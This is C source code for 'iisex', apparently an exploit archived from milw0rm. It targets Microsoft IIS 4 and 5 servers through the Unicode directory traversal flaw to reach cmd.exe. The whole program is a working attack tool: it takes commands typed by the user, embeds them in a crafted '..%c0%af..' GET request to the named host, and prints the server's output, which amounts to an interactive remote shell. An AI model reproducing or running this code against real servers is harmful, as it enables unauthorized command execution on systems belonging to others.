/* iisex iis exploit  (<- nost's idea) v2
 * --------------------------------------
 * Okay.. the first piece of code was not really finished.
 * So, i apologize to everybody.. 
 *
 * by incubus <incubus@securax.org>
 *
 * grtz to: Bio, nos, zoa, reg and vor... (who else would stay up 
 * at night to exploit this?) to securax (#securax@efnet) - also 
 * to kim, glyc, s0ph, tessa, lamagra and steven.
 */ 
     
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main(int argc, char **argv){
  char buffy[666]; /* well, what else? I dunno how long your commands are.. */
  char buf[500];
  char rcvbuf[8192];
  int i, sock, result;
  struct sockaddr_in 	name;
  struct hostent 	*hostinfo;
  if (argc < 2){
    printf ("try %s www.server.com\n", argv[0]);
    printf ("will let you play with cmd.exe of an IIS4/5 server.\n");
    printf ("by incubus <incubus@securax.org>\n\n");
    exit(0);
  }
  printf ("\niisex - iis 4 and 5 exploit\n---------------------------\n");
  printf ("act like a cmd.exe kiddie, type quit to quit.\n");
  for (;;)
  {
    printf ("\n[enter cmd> ");
    gets(buf);
    if (strstr(buf, "quit")) exit(0);
    i=0;
    while (buf[i] != '\n'){
      if(buf[i] == 32) buf[i] = 43;
      i++; 
    }
    hostinfo=gethostbyname(argv[1]);
    if (!hostinfo){
      herror("Oops"); exit(-1);
    }
    name.sin_family=AF_INET; name.sin_port=htons(80);
    name.sin_addr=*(struct in_addr *)hostinfo->h_addr;
    sock=socket(AF_INET, SOCK_STREAM, 0);
    result=connect(sock, (struct sockaddr *)&name, sizeof(struct sockaddr_in));
    if (result != 0) { herror("Oops"); exit(-1); }
      if (sock < 0){
        herror("Oops"); exit(-1);
    }
    strcpy(buffy,"GET /scripts/..\%c0%af../winnt/system32/cmd.exe?/c+");
    strcat(buffy,buf);
    strcat(buffy, " HTTP/1.0\n\n");
    send(sock, buffy, sizeof(buffy), 0);
    recv(sock, rcvbuf, sizeof(rcvbuf), 0);
    printf ("%s", rcvbuf);
    close(sock);
  }
}


// milw0rm.com [2000-11-18]
